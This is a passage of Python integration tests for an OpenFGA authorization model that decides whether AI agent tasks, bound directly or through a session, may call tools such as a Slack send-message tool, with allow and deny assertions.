    # Write chain (no grant needed — public tools use task:* can_call_agent_user)
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:agent_1",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"session:{session_id}",
                relation="session",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"session:{session_id}",
            ),
        ]
    )

    # can_call WITHOUT context → denied
    denied = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object=public_tool,
    )
    assert denied is False, "Public tool can_call should be denied without context"

    # can_call WITH context → passes
    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object=public_tool,
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object=public_tool,
            ),
        ],
    )
    assert allowed is True, "Public tool can_call should pass with context"


# ---------------------------------------------------------------------------
# Direct task→agent_user binding (autonomous mode — no session)
# ---------------------------------------------------------------------------


@pytest.mark.asyncio
async def test_direct_task_binding_allows_task_scoped_grant(server_and_client) -> None:
    """Direct task→agent_user binding: task grant works without a session.

    In autonomous mode the orchestrator writes task:X → agent_user:Z directly,
    skipping the session entirely. The FGA model's `define task: [task] or task
    from session` allows both paths.
    """
    _ = server_and_client
    task_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__autonomous"

    # Write direct binding + identity + grant (NO session tuples)
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:autonomous",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            # Direct task → agent_user (autonomous mode)
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"agent_user:{agent_user_id}",
            ),
            # Task-scoped grant
            ClientTuple(
                user=f"task:{task_id}",
                relation="can_call_task",
                object="tool:slack_send_message",
            ),
        ]
    )

    # can_call with context → passes via direct binding
    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:slack_send_message",
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object="tool:slack_send_message",
            ),
        ],
    )
    assert allowed is True, "Direct binding should allow task-scoped grant"


@pytest.mark.asyncio
async def test_direct_task_binding_allows_tool_resource_grant(server_and_client) -> None:
    """Direct binding works for tool_resource grants too."""
    _ = server_and_client
    task_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__autonomous"
    fga_object = "tool_resource:slack_send_message/slack_C5XMACTML"

    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:autonomous",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="task",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="can_call_task",
                object=fga_object,
            ),
        ]
    )

    allowed = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object=fga_object,
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object=fga_object,
            ),
            ClientTuple(
                user="tool:slack_send_message",
                relation="parent_tool",
                object=fga_object,
            ),
        ],
    )
    assert allowed is True, "Direct binding should allow tool_resource grant"


@pytest.mark.asyncio
async def test_direct_task_binding_denied_for_unbound_task(server_and_client) -> None:
    """A task with neither direct binding nor session is denied."""
    _ = server_and_client
    task_id = str(uuid.uuid4())
    agent_user_id = f"inttest_{uuid.uuid4().hex[:8]}__autonomous"

    # Write identity + grant but NO binding (neither direct nor session)
    await _direct_fga_write(
        [
            ClientTuple(
                user="user:inttest",
                relation="user",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user="agent:autonomous",
                relation="agent",
                object=f"agent_user:{agent_user_id}",
            ),
            ClientTuple(
                user=f"task:{task_id}",
                relation="can_call_task",
                object="tool:slack_send_message",
            ),
        ]
    )

    denied = await _direct_fga_check(
        user=f"task:{task_id}",
        relation="can_call",
        fga_object="tool:slack_send_message",
        contextual_tuples=[
            ClientTuple(
                user=f"agent_user:{agent_user_id}",
                relation="agent_user_in_context",
                object="tool:slack_send_message",
            ),
        ],
    )
    assert denied is False, "Unbound task should be denied even with grant"
